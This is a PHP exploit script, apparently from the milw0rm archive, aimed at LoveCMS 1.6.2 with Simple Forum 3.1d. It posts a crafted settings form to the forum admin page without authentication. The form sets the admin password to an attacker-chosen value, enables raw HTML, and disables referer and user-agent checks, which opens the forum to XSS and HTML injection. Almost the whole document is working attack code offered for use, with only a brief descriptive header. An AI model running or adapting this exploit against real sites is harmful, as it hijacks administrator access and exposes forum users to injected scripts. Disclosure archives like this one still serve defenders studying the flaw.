<?php

/**
* LoveCMS 1.6.2 Final (Simple Forum 3.1d) Change Admin Password Exploit
* Vulnerability found & exploited by cOndemned
*
* Download: 
*	http://www.thethinkingman.net/modules/download_manager/?id=4
*
* Description:
*	This exploit changes forum admin password (ex. attacker will be
*	able to delete threads/topics) and sets allowHTML to true 
*	(attacks such as XSS/HTML Injection will be possible)
*
*/

	$target	= 'localhost/audits/lovecms';
	$pass	= 'timetodie';
	$buff = array
		(
			'language'		=> 'en',
			'forumWidth'		=> '500',
			'forumAlign'		=> 'left',
			'forumTitle'		=> 'Simple Forum',
			'threadsPerPage'	=> '15',
			'wordLength'		=> '50',
			'autoDelete'		=> '12',
			'adminPass'		=> $pass,
			'allowHTML'		=> '1',
			'allowURLs'		=> '1',
			'allowUBBs'		=> '1',
			'enableIDs'		=> '0',
			'enableSignature'	=> '1',
			'enableRefererCheck'	=> '0',
			'enableAgentCheck'	=> '0',
			'agents'		=> 'Mozilla.Opera.Lynx.Mosaic.amaya.WebExplorer.IBrowse.iCab',
			'nonos'			=> 'fuck.asshole',
			'update'		=> 'Update'
		);

	$xpl = curl_init();

	curl_setopt($xpl, CURLOPT_URL, $target . '/modules/simpleforum/admin/index.php');
	curl_setopt($xpl, CURLOPT_POST, 1);
	curl_setopt($xpl, CURLOPT_POSTFIELDS, $buff);

	curl_exec($xpl);
	curl_close($xpl);

	echo "[!] Go to the website and check if U can login.\r\n";	
?>

# milw0rm.com [2008-11-22]
